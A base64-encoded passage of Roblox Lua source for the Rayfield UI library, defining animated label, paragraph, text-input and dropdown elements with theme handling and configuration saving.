25lbnRpYWwpLCB7SW1hZ2VUcmFuc3BhcmVuY3kgPSAwLjJ9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShMYWJlbC5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IENvbG9yIGFuZCAwLjIgb3IgMH0pOlBsYXkoKQkKCgkJCWZ1bmN0aW9uIExhYmVsVmFsdWU6U2V0KE5ld0xhYmVsLCBJY29uLCBDb2xvcikKCQkJCUxhYmVsLlRpdGxlLlRleHQgPSBOZXdMYWJlbAoKCQkJCWlmIENvbG9yIHRoZW4KCQkJCQlMYWJlbC5CYWNrZ3JvdW5kQ29sb3IzID0gQ29sb3Igb3IgU2VsZWN0ZWRUaGVtZS5TZWNvbmRhcnlFbGVtZW50QmFja2dyb3VuZAoJCQkJCUxhYmVsLlVJU3Ryb2tlLkNvbG9yID0gQ29sb3Igb3IgU2VsZWN0ZWRUaGVtZS5TZWNvbmRhcnlFbGVtZW50U3Ryb2tlCgkJCQllbmQKCgkJCQlpZiBJY29uIGFuZCBMYWJlbDpGaW5kRmlyc3RDaGlsZCgnSWNvbicpIHRoZW4KCQkJCQlMYWJlbC5UaXRsZS5Qb3NpdGlvbiA9IFVEaW0yLm5ldygwLCA0NSwgMC41LCAwKQoJCQkJCUxhYmVsLlRpdGxlLlNpemUgPSBVRGltMi5uZXcoMSwgLTEwMCwgMCwgMTQpCgoJCQkJCWlmIEljb24gdGhlbgoJCQkJCQlpZiB0eXBlb2YoSWNvbikgPT0gJ3N0cmluZycgYW5kIEljb25zIHRoZW4KCQkJCQkJCWxvY2FsIGFzc2V0ID0gZ2V0SWNvbihJY29uKQoKCQkJCQkJCUxhYmVsLkljb24uSW1hZ2UgPSAncmJ4YXNzZXRpZDovLycuLmFzc2V0LmlkCgkJCQkJCQlMYWJlbC5JY29uLkltYWdlUmVjdE9mZnNldCA9IGFzc2V0LmltYWdlUmVjdE9mZnNldAoJCQkJCQkJTGFiZWwuSWNvbi5JbWFnZVJlY3RTaXplID0gYXNzZXQuaW1hZ2VSZWN0U2l6ZQoJCQkJCQllbHNlCgkJCQkJCQlMYWJlbC5JY29uLkltYWdlID0gZ2V0QXNzZXRVcmkoSWNvbikKCQkJCQkJZW5kCgkJCQkJZWxzZQoJCQkJCQlMYWJlbC5JY29uLkltYWdlID0gInJieGFzc2V0aWQ6Ly8iIC4uIDAKCQkJCQllbmQKCgkJCQkJTGFiZWwuSWNvbi5WaXNpYmxlID0gdHJ1ZQoJCQkJZW5kCgkJCWVuZAoKCQkJUmF5ZmllbGQuTWFpbjpHZXRQcm9wZXJ0eUNoYW5nZWRTaWduYWwoJ0JhY2tncm91bmRDb2xvcjMnKTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCUxhYmVsLkJhY2tncm91bmRDb2xvcjMgPSBJZ25vcmVUaGVtZSBhbmQgKENvbG9yIG9yIExhYmVsLkJhY2tncm91bmRDb2xvcjMpIG9yIFNlbGVjdGVkVGhlbWUuU2Vjb25kYXJ5RWxlbWVudEJhY2tncm91bmQKCQkJCUxhYmVsLlVJU3Ryb2tlLkNvbG9yID0gSWdub3JlVGhlbWUgYW5kIChDb2xvciBvciBMYWJlbC5CYWNrZ3JvdW5kQ29sb3IzKSBvciBTZWxlY3RlZFRoZW1lLlNlY29uZGFyeUVsZW1lbnRTdHJva2UKCQkJZW5kKQoKCQkJcmV0dXJuIExhYmVsVmFsdWUKCQllbmQKCgkJLS0gUGFyYWdyYXBoCgkJZnVuY3Rpb24gVGFiOkNyZWF0ZVBhcmFncmFwaChQYXJhZ3JhcGhTZXR0aW5ncykKCQkJbG9jYWwgUGFyYWdyYXBoVmFsdWUgPSB7fQoKCQkJbG9jYWwgUGFyYWdyYXBoID0gRWxlbWVudHMuVGVtcGxhdGUuUGFyYWdyYXBoOkNsb25lKCkKCQkJUGFyYWdyYXBoLlRpdGxlLlRleHQgPSBQYXJhZ3JhcGhTZXR0aW5ncy5UaXRsZQoJCQlQYXJhZ3JhcGguQ29udGVudC5UZXh0ID0gUGFyYWdyYXBoU2V0dGluZ3MuQ29udGVudAoJCQlQYXJhZ3JhcGguVmlzaWJsZSA9IHRydWUKCQkJUGFyYWdyYXBoLlBhcmVudCA9IFRhYlBhZ2UKCgkJCVBhcmFncmFwaC5CYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMQoJCQlQYXJhZ3JhcGguVUlTdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoJCQlQYXJhZ3JhcGguVGl0bGUuVGV4dFRyYW5zcGFyZW5jeSA9IDEKCQkJUGFyYWdyYXBoLkNvbnRlbnQuVGV4dFRyYW5zcGFyZW5jeSA9IDEKCgkJCVBhcmFncmFwaC5CYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5TZWNvbmRhcnlFbGVtZW50QmFja2dyb3VuZAoJCQlQYXJhZ3JhcGguVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLlNlY29uZGFyeUVsZW1lbnRTdHJva2UKCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoUGFyYWdyYXBoLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFBhcmFncmFwaC5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKFBhcmFncmFwaC5UaXRsZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VGV4dFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkJCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoUGFyYWdyYXBoLkNvbnRlbnQsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCQoKCQkJZnVuY3Rpb24gUGFyYWdyYXBoVmFsdWU6U2V0KE5ld1BhcmFncmFwaFNldHRpbmdzKQoJCQkJUGFyYWdyYXBoLlRpdGxlLlRleHQgPSBOZXdQYXJhZ3JhcGhTZXR0aW5ncy5UaXRsZQoJCQkJUGFyYWdyYXBoLkNvbnRlbnQuVGV4dCA9IE5ld1BhcmFncmFwaFNldHRpbmdzLkNvbnRlbnQKCQkJZW5kCgoJCQlSYXlmaWVsZC5NYWluOkdldFByb3BlcnR5Q2hhbmdlZFNpZ25hbCgnQmFja2dyb3VuZENvbG9yMycpOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJUGFyYWdyYXBoLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlNlY29uZGFyeUVsZW1lbnRCYWNrZ3JvdW5kCgkJCQlQYXJhZ3JhcGguVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLlNlY29uZGFyeUVsZW1lbnRTdHJva2UKCQkJZW5kKQoKCQkJcmV0dXJuIFBhcmFncmFwaFZhbHVlCgkJZW5kCgoJCS0tIElucHV0CgkJZnVuY3Rpb24gVGFiOkNyZWF0ZUlucHV0KElucHV0U2V0dGluZ3MpCgkJCWxvY2FsIElucHV0ID0gRWxlbWVudHMuVGVtcGxhdGUuSW5wdXQ6Q2xvbmUoKQoJCQlJbnB1dC5OYW1lID0gSW5wdXRTZXR0aW5ncy5OYW1lCgkJCUlucHV0LlRpdGxlLlRleHQgPSBJbnB1dFNldHRpbmdzLk5hbWUKCQkJSW5wdXQuVmlzaWJsZSA9IHRydWUKCQkJSW5wdXQuUGFyZW50ID0gVGFiUGFnZQoKCQkJSW5wdXQuQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQkJSW5wdXQuVUlTdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoJCQlJbnB1dC5UaXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoKCQkJSW5wdXQuSW5wdXRGcmFtZS5JbnB1dEJveC5UZXh0ID0gSW5wdXRTZXR0aW5ncy5DdXJyZW50VmFsdWUgb3IgJycKCgkJCUlucHV0LklucHV0RnJhbWUuQmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuSW5wdXRCYWNrZ3JvdW5kCgkJCUlucHV0LklucHV0RnJhbWUuVUlTdHJva2UuQ29sb3IgPSBTZWxlY3RlZFRoZW1lLklucHV0U3Ryb2tlCgoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKElucHV0LCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kVHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKElucHV0LlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCVR3ZWVuU2VydmljZTpDcmVhdGUoSW5wdXQuVGl0bGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RleHRUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCQoKCQkJSW5wdXQuSW5wdXRGcmFtZS5JbnB1dEJveC5QbGFjZWhvbGRlclRleHQgPSBJbnB1dFNldHRpbmdzLlBsYWNlaG9sZGVyVGV4dAoJCQlJbnB1dC5JbnB1dEZyYW1lLlNpemUgPSBVRGltMi5uZXcoMCwgSW5wdXQuSW5wdXRGcmFtZS5JbnB1dEJveC5UZXh0Qm91bmRzLlggKyAyNCwgMCwgMzApCgoJCQlJbnB1dC5JbnB1dEZyYW1lLklucHV0Qm94LkZvY3VzTG9zdDpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCWxvY2FsIFN1Y2Nlc3MsIFJlc3BvbnNlID0gcGNhbGwoZnVuY3Rpb24oKQoJCQkJCUlucHV0U2V0dGluZ3MuQ2FsbGJhY2soSW5wdXQuSW5wdXRGcmFtZS5JbnB1dEJveC5UZXh0KQoJCQkJCUlucHV0U2V0dGluZ3MuQ3VycmVudFZhbHVlID0gSW5wdXQuSW5wdXRGcmFtZS5JbnB1dEJveC5UZXh0CgkJCQllbmQpCgoJCQkJaWYgbm90IFN1Y2Nlc3MgdGhlbgoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoSW5wdXQsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBDb2xvcjMuZnJvbVJHQig4NSwgMCwgMCl9KTpQbGF5KCkKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKElucHV0LlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJSW5wdXQuVGl0bGUuVGV4dCA9ICJDYWxsYmFjayBFcnJvciIKCQkJCQlwcmludCgiUmF5ZmllbGQgfCAiLi5JbnB1dFNldHRpbmdzLk5hbWUuLiIgQ2FsbGJhY2sgRXJyb3IgIiAuLnRvc3RyaW5nKFJlc3BvbnNlKSkKCQkJCQl3YXJuKCdDaGVjayBkb2NzLnNpcml1cy5tZW51IGZvciBoZWxwIHdpdGggUmF5ZmllbGQgc3BlY2lmaWMgZGV2ZWxvcG1lbnQuJykKCQkJCQl0YXNrLndhaXQoMC41KQoJCQkJCUlucHV0LlRpdGxlLlRleHQgPSBJbnB1dFNldHRpbmdzLk5hbWUKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKElucHV0LCBUd2VlbkluZm8ubmV3KDAuNiwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoSW5wdXQuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCWVuZAoKCQkJCWlmIElucHV0U2V0dGluZ3MuUmVtb3ZlVGV4dEFmdGVyRm9jdXNMb3N0IHRoZW4KCQkJCQlJbnB1dC5JbnB1dEZyYW1lLklucHV0Qm94LlRleHQgPSAiIgoJCQkJZW5kCgoJCQkJaWYgbm90IElucHV0U2V0dGluZ3MuRXh0IHRoZW4KCQkJCQlTYXZlQ29uZmlndXJhdGlvbigpCgkJCQllbmQKCQkJZW5kKQoKCQkJSW5wdXQuTW91c2VFbnRlcjpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoSW5wdXQsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kSG92ZXJ9KTpQbGF5KCkKCQkJZW5kKQoKCQkJSW5wdXQuTW91c2VMZWF2ZTpDb25uZWN0KGZ1bmN0aW9uKCkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoSW5wdXQsIFR3ZWVuSW5mby5uZXcoMC42LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCWVuZCkKCgkJCUlucHV0LklucHV0RnJhbWUuSW5wdXRCb3g6R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCJUZXh0Iik6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKElucHV0LklucHV0RnJhbWUsIFR3ZWVuSW5mby5uZXcoMC41NSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCwgRW51bS5FYXNpbmdEaXJlY3Rpb24uT3V0KSwge1NpemUgPSBVRGltMi5uZXcoMCwgSW5wdXQuSW5wdXRGcmFtZS5JbnB1dEJveC5UZXh0Qm91bmRzLlggKyAyNCwgMCwgMzApfSk6UGxheSgpCgkJCWVuZCkKCgkJCWZ1bmN0aW9uIElucHV0U2V0dGluZ3M6U2V0KHRleHQpCgkJCQlJbnB1dC5JbnB1dEZyYW1lLklucHV0Qm94LlRleHQgPSB0ZXh0CgkJCQlJbnB1dFNldHRpbmdzLkN1cnJlbnRWYWx1ZSA9IHRleHQKCgkJCQlsb2NhbCBTdWNjZXNzLCBSZXNwb25zZSA9IHBjYWxsKGZ1bmN0aW9uKCkKCQkJCQlJbnB1dFNldHRpbmdzLkNhbGxiYWNrKHRleHQpCgkJCQllbmQpCgoJCQkJaWYgbm90IElucHV0U2V0dGluZ3MuRXh0IHRoZW4KCQkJCQlTYXZlQ29uZmlndXJhdGlvbigpCgkJCQllbmQKCQkJZW5kCgoJCQlpZiBTZXR0aW5ncy5Db25maWd1cmF0aW9uU2F2aW5nIHRoZW4KCQkJCWlmIFNldHRpbmdzLkNvbmZpZ3VyYXRpb25TYXZpbmcuRW5hYmxlZCBhbmQgSW5wdXRTZXR0aW5ncy5GbGFnIHRoZW4KCQkJCQlSYXlmaWVsZExpYnJhcnkuRmxhZ3NbSW5wdXRTZXR0aW5ncy5GbGFnXSA9IElucHV0U2V0dGluZ3MKCQkJCWVuZAoJCQllbmQKCgkJCVJheWZpZWxkLk1haW46R2V0UHJvcGVydHlDaGFuZ2VkU2lnbmFsKCdCYWNrZ3JvdW5kQ29sb3IzJyk6Q29ubmVjdChmdW5jdGlvbigpCgkJCQlJbnB1dC5JbnB1dEZyYW1lLkJhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLklucHV0QmFja2dyb3VuZAoJCQkJSW5wdXQuSW5wdXRGcmFtZS5VSVN0cm9rZS5Db2xvciA9IFNlbGVjdGVkVGhlbWUuSW5wdXRTdHJva2UKCQkJZW5kKQoKCQkJcmV0dXJuIElucHV0U2V0dGluZ3MKCQllbmQKCgkJLS0gRHJvcGRvd24KCQlmdW5jdGlvbiBUYWI6Q3JlYXRlRHJvcGRvd24oRHJvcGRvd25TZXR0aW5ncykKCQkJbG9jYWwgRHJvcGRvd24gPSBFbGVtZW50cy5UZW1wbGF0ZS5Ecm9wZG93bjpDbG9uZSgpCgkJCWlmIHN0cmluZy5maW5kKERyb3Bkb3duU2V0dGluZ3MuTmFtZSwiY2xvc2VkIikgdGhlbgoJCQkJRHJvcGRvd24uTmFtZSA9ICJEcm9wZG93biIKCQkJZWxzZQoJCQkJRHJvcGRvd24uTmFtZSA9IERyb3Bkb3duU2V0dGluZ3MuTmFtZQoJCQllbmQKCQkJRHJvcGRvd24uVGl0bGUuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuTmFtZQoJCQlEcm9wZG93bi5WaXNpYmxlID0gdHJ1ZQoJCQlEcm9wZG93bi5QYXJlbnQgPSBUYWJQYWdlCgoJCQlEcm9wZG93bi5MaXN0LlZpc2libGUgPSBmYWxzZQoJCQlpZiBEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24gdGhlbgoJCQkJaWYgdHlwZShEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24pID09ICJzdHJpbmciIHRoZW4KCQkJCQlEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24gPSB7RHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9ufQoJCQkJZW5kCgkJCQlpZiBub3QgRHJvcGRvd25TZXR0aW5ncy5NdWx0aXBsZU9wdGlvbnMgYW5kIHR5cGUoRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uKSA9PSAidGFibGUiIHRoZW4KCQkJCQlEcm9wZG93blNldHRpbmdzLkN1cnJlbnRPcHRpb24gPSB7RHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uWzFdfQoJCQkJZW5kCgkJCWVsc2UKCQkJCURyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiA9IHt9CgkJCWVuZAoKCQkJaWYgRHJvcGRvd25TZXR0aW5ncy5NdWx0aXBsZU9wdGlvbnMgdGhlbgoJCQkJaWYgRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uIGFuZCB0eXBlKERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbikgPT0gInRhYmxlIiB0aGVuCgkJCQkJaWYgI0Ryb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvbiA9PSAxIHRoZW4KCQkJCQkJRHJvcGRvd24uU2VsZWN0ZWQuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXQoJCQkJCWVsc2VpZiAjRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID09IDAgdGhlbgoJCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gIk5vbmUiCgkJCQkJZWxzZQoJCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gIlZhcmlvdXMiCgkJCQkJZW5kCgkJCQllbHNlCgkJCQkJRHJvcGRvd25TZXR0aW5ncy5DdXJyZW50T3B0aW9uID0ge30KCQkJCQlEcm9wZG93bi5TZWxlY3RlZC5UZXh0ID0gIk5vbmUiCgkJCQllbmQKCQkJZWxzZQoJCQkJRHJvcGRvd24uU2VsZWN0ZWQuVGV4dCA9IERyb3Bkb3duU2V0dGluZ3MuQ3VycmVudE9wdGlvblsxXSBvciAiTm9uZSIKCQkJZW5kCgoJCQlEcm9wZG93bi5Ub2dnbGUuSW1hZ2VDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLlRleHRDb2xvcgoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtCYWNrZ3JvdW5kQ29sb3IzID0gU2VsZWN0ZWRUaGVtZS5FbGVtZW50QmFja2dyb3VuZH0pOlBsYXkoKQoKCQkJRHJvcGRvd24uQmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDEKCQkJRHJvcGRvd24uVUlTdHJva2UuVHJhbnNwYXJlbmN5ID0gMQoJCQlEcm9wZG93bi5UaXRsZS5UZXh0VHJhbnNwYXJlbmN5ID0gMQoKCQkJRHJvcGRvd24uU2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDQ1KQoKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93bi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjcsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQoJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMH0pOlBsYXkoKQkKCgkJCWZvciBfLCB1bnVudXNlZG9wdGlvbiBpbiBpcGFpcnMoRHJvcGRvd24uTGlzdDpHZXRDaGlsZHJlbigpKSBkbwoJCQkJaWYgdW51bnVzZWRvcHRpb24uQ2xhc3NOYW1lID09ICJGcmFtZSIgYW5kIHVudW51c2Vkb3B0aW9uLk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCQkJdW51bnVzZWRvcHRpb246RGVzdHJveSgpCgkJCQllbmQKCQkJZW5kCgoJCQlEcm9wZG93bi5Ub2dnbGUuUm90YXRpb24gPSAxODAKCgkJCURyb3Bkb3duLkludGVyYWN0Lk1vdXNlQnV0dG9uMUNsaWNrOkNvbm5lY3QoZnVuY3Rpb24oKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZENvbG9yMyA9IFNlbGVjdGVkVGhlbWUuRWxlbWVudEJhY2tncm91bmRIb3Zlcn0pOlBsYXkoKQoJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93bi5VSVN0cm9rZSwgVHdlZW5JbmZvLm5ldygwLjQsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJdGFzay53YWl0KDAuMSkKCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24sIFR3ZWVuSW5mby5uZXcoMC40LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRDb2xvcjMgPSBTZWxlY3RlZFRoZW1lLkVsZW1lbnRCYWNrZ3JvdW5kfSk6UGxheSgpCgkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuNCwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAwfSk6UGxheSgpCgkJCQlpZiBEZWJvdW5jZSB0aGVuIHJldHVybiBlbmQKCQkJCWlmIERyb3Bkb3duLkxpc3QuVmlzaWJsZSB0aGVuCgkJCQkJRGVib3VuY2UgPSB0cnVlCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93biwgVHdlZW5JbmZvLm5ldygwLjUsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7U2l6ZSA9IFVEaW0yLm5ldygxLCAtMTAsIDAsIDQ1KX0pOlBsYXkoKQoJCQkJCWZvciBfLCBEcm9wZG93bk9wdCBpbiBpcGFpcnMoRHJvcGRvd24uTGlzdDpHZXRDaGlsZHJlbigpKSBkbwoJCQkJCQlpZiBEcm9wZG93bk9wdC5DbGFzc05hbWUgPT0gIkZyYW1lIiBhbmQgRHJvcGRvd25PcHQuTmFtZSB+PSAiUGxhY2Vob2xkZXIiIHRoZW4KCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd25PcHQsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge0JhY2tncm91bmRUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duT3B0LlVJU3Ryb2tlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUcmFuc3BhcmVuY3kgPSAxfSk6UGxheSgpCgkJCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duT3B0LlRpdGxlLCBUd2VlbkluZm8ubmV3KDAuMywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtUZXh0VHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCQllbmQKCQkJCQllbmQKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLkxpc3QsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1Njcm9sbEJhckltYWdlVHJhbnNwYXJlbmN5ID0gMX0pOlBsYXkoKQoJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd24uVG9nZ2xlLCBUd2VlbkluZm8ubmV3KDAuNywgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtSb3RhdGlvbiA9IDE4MH0pOlBsYXkoKQkKCQkJCQl0YXNrLndhaXQoMC4zNSkKCQkJCQlEcm9wZG93bi5MaXN0LlZpc2libGUgPSBmYWxzZQoJCQkJCURlYm91bmNlID0gZmFsc2UKCQkJCWVsc2UKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLCBUd2VlbkluZm8ubmV3KDAuNSwgRW51bS5FYXNpbmdTdHlsZS5FeHBvbmVudGlhbCksIHtTaXplID0gVURpbTIubmV3KDEsIC0xMCwgMCwgMTgwKX0pOlBsYXkoKQoJCQkJCURyb3Bkb3duLkxpc3QuVmlzaWJsZSA9IHRydWUKCQkJCQlUd2VlblNlcnZpY2U6Q3JlYXRlKERyb3Bkb3duLkxpc3QsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1Njcm9sbEJhckltYWdlVHJhbnNwYXJlbmN5ID0gMC43fSk6UGxheSgpCgkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93bi5Ub2dnbGUsIFR3ZWVuSW5mby5uZXcoMC43LCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1JvdGF0aW9uID0gMH0pOlBsYXkoKQkKCQkJCQlmb3IgXywgRHJvcGRvd25PcHQgaW4gaXBhaXJzKERyb3Bkb3duLkxpc3Q6R2V0Q2hpbGRyZW4oKSkgZG8KCQkJCQkJaWYgRHJvcGRvd25PcHQuQ2xhc3NOYW1lID09ICJGcmFtZSIgYW5kIERyb3Bkb3duT3B0Lk5hbWUgfj0gIlBsYWNlaG9sZGVyIiB0aGVuCgkJCQkJCQlpZiBEcm9wZG93bk9wdC5OYW1lIH49IERyb3Bkb3duLlNlbGVjdGVkLlRleHQgdGhlbgoJCQkJCQkJCVR3ZWVuU2VydmljZTpDcmVhdGUoRHJvcGRvd25PcHQuVUlTdHJva2UsIFR3ZWVuSW5mby5uZXcoMC4zLCBFbnVtLkVhc2luZ1N0eWxlLkV4cG9uZW50aWFsKSwge1RyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCQkJCWVuZAoJCQkJCQkJVHdlZW5TZXJ2aWNlOkNyZWF0ZShEcm9wZG93bk9wdCwgVHdlZW5JbmZvLm5ldygwLjMsIEVudW0uRWFzaW5nU3R5bGUuRXhwb25lbnRpYWwpLCB7QmFja2dyb3VuZFRyYW5zcGFyZW5jeSA9IDB9KTpQbGF5KCkKCQkJCQkJCVR3ZWVuU2Vydml